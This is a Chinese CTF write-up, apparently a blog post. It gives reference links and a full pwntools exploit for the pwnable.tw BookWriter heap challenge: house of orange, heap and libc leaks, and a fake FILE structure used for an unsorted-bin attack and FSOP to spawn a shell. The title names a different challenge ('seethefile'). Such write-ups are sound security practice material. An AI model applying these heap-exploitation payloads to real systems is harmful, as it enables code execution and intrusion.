---
title: 和媳妇一起学Pwn 之 seethefile
date: 2020-04-04 00:00:00
categories:
- CTF/Pwn
tags: pwnable.tw  BookWriter
---

> 本题总结点较多，之后总结

- 题目地址：[https://pwnable.tw/challenge/#24](https://pwnable.tw/challenge/#24)

## 参考

- [house of orange 漏洞](http://blog.eonew.cn/archives/1093)
- [IO FILE 学习笔记](https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)

- [pwnable.tw 1~10题 writeup](https://veritas501.space/2018/02/21/pwnable.tw%201~10%E9%A2%98%20writeup/)
- [pwnable.tw 11~18题 writeup](https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/)

- [pwnable.tw部分writeup(不定期更新)](https://0xffff.one/d/410)
- [pwnable.tw部分writeup(不定期更新)_Vol.2](https://0xffff.one/d/469)

- [BookWriter Writeup](http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/)
- [pwnable tw bookwriter writeup](https://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/)
- [BookWriter 解题思路](http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/)
- [pwnable.tw bookwriter writeup – house of orange 的巧妙利用](http://blog.eonew.cn/archives/1140)
- [pwnable.tw中的bookwriter](https://www.lyyl.online/2019/10/08/pwnable-tw%E4%B8%AD%E7%9A%84bookwriter/)
- [从BookWriter看house_of_orange原理](https://bbs.pediy.com/thread-223334.htm)
- [Pwnable.tw之BookWriter](https://bbs.pediy.com/thread-226694.htm)


## exp

```python
from pwn import *

context(arch='amd64',os='linux',log_level='debug')
myelf  = ELF("./bookwriter")
libc   = ELF("./libc_64.so.6")
io     = remote("chall.pwnable.tw",10304)

uu64        = lambda data          :  u64(data.ljust(8, b'\0'))
sla         = lambda delim,data    :  (io.sendlineafter(delim, data))
sa          = lambda delim,data    :  (io.sendafter(delim, data))
start       = lambda author        :  (sla("Author :",author))
add         = lambda size,content  :  (sla("choice :","1"),sla("page :",str(size)),sa("Content :",content))
view        = lambda num           :  (sla("choice :","2"),sla("page :",str(num)))
edit        = lambda num,content   :  (sla("choice :","3"),sla("page :",str(num)),sla("Content:",content))
show        = lambda               :  (sla("choice :","4"))

# fill author  
start("x"*60+'xuan')

# overlap and modify top chunk size 
add(0x18,'a')
edit(0,'b'*0x18)
edit(0,'\x00'*0x18+'\xe1\x0f')

# leak heap
show();io.recvuntil("xuan")
heap_addr = uu64(io.recvuntil("\n")[:-1])
sla(") ",'0')

# move top chunk to unsorted bin
add(0x1000,'a')
for i in range(7):
    add(0x18,'xuanxuan')

# leak libc
view(2);io.recvuntil("xuanxuan")
libc.address = uu64(io.readline()[:-1])-0x3c4188

# make fake file 
data = "\x00"*(0x20*7+0x10)
payload  = "/bin/sh\x00" + p64(0x61) 
payload += p64(0) + p64(libc.symbols['_IO_list_all']-0x10) 
payload += p64(0) + p64(1)
payload = payload.ljust(0xd8, "\x00")
payload += p64(heap_addr + 0x20*7+0x10 + 0xd8 + 0x8)+p64(libc.symbols['system'])*4

# use unsorted bin attack and FOSP to getshell
edit(0,data+payload)
sla("choice :","1");sla("page :",str(0x10))
io.interactive()
```